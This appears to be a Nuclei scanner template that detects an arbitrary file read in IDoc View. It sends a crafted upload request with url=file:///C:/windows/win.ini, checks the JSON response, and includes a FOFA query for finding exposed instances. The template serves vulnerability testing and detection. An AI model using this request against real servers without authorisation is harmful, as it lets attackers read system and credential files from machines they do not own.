http:
    - extractors:
        - group: 1
          internal: true
          name: filepath
          part: body
          regex:
            - '"srcUrl":"\/([a-z/0-9_.]+)"'
          type: regex
      matchers:
        - condition: and
          dsl:
            - status_code == 200
            - contains(content_type, 'application/json')
            - contains_all(body, "ext", "srcUrl", "success", "md5")
          type: dsl
      method: GET
      path:
        - '{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt'
id: idocview-lfi
info:
    author: DhiyaneshDK
    metadata:
        fofa-query: title=="在线文档预览 - I Doc View"
        max-request: 1
        verified: true
    name: IDoc View - Arbitrary File Read
    severity: high
    tags:
        - idoc
        - file-read
        - IDocView
variables:
    file: '{{to_lower(rand_text_alpha(5))}}'
